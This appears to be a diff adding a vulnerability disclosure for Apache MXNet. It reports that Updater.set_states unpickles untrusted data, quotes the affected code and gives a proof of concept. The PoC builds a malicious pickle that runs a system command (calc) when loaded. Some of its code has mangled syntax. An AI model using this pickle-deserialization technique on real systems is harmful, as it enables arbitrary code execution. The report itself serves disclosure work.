@@ -1,0 +1,37 @@
+ Apache mxnet does not verify state content when setting state, which allows attackers to construct malicious content and execute arbitrary commands. 
+
+ Using Python to reproduce the vulnerability 
+
+
+ Install mxnet first 
+
+
+pip install numpy==1.23.1
+pip install mxnet -f https://dist.mxnet.io/python/cpu
+
+ Apache mxnet set state, found no verification of state content 
+https://github.com/apache/mxnet/blob/3f8f3be9987e259491ddc5a78aa9c6903e0b21e3/python/mxnet/optimizer/optimizer.py#L2142
+code:
+{
+ def set_states(self, states):
+        """Sets updater states."""
+        states = pickle.loads(states)
+        if isinstance(states, tuple) and len(states) == 2:
+            self.states, self.optimizer = states
+        else:
+            self.states = states
+        self.states_synced = dict.fromkeys(self.states.keys(), False)
+}
+
+ This test is carried out under windows, malicious data is constructed, and any command can be executed after loading, and the calculator is ejected. 
+ test script ：
+{import pickle class A():
+def   reduce (self):
+return eval, (" import ('os').system('calc')",)
+x = [A()]
+f = open("evil.pkl","wb") pickle.dump(x,f) f.close()
+
+from mxnet.optimizer import Updater,Optimizer
+test = Updater(Optimizer())
+
+with open("evil.pkl","rb") as d: test.set_states(d.read())}
